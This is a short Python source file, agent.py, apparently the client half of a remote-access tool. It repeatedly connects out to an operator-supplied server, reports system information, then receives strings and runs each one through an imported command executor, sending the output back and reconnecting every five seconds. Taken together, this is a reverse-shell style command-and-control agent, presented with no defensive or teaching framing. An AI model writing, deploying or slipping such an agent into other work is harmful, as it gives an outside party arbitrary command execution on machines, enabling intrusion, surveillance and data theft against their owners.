# agent.py
import socket
import threading
import time
from executor import execute_command
from systeminfo import get_system_info
from sender import send_to_server
import argparse

def agent_loop(server_ip, server_port):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_ip, server_port))
            send_to_server(client, f"[AGENT ONLINE] {get_system_info()}")
            while True:
                data = client.recv(1024).decode()
                if not data:
                    break
                result = execute_command(data)
                send_to_server(client, result)
        except Exception as e:
            print("Connection error:", e)
        time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True, help="Server IP with port, e.g., 127.0.0.1:9999")
    args = parser.parse_args()
    ip, port = args.server.split(":")
    agent_loop(ip, int(port))
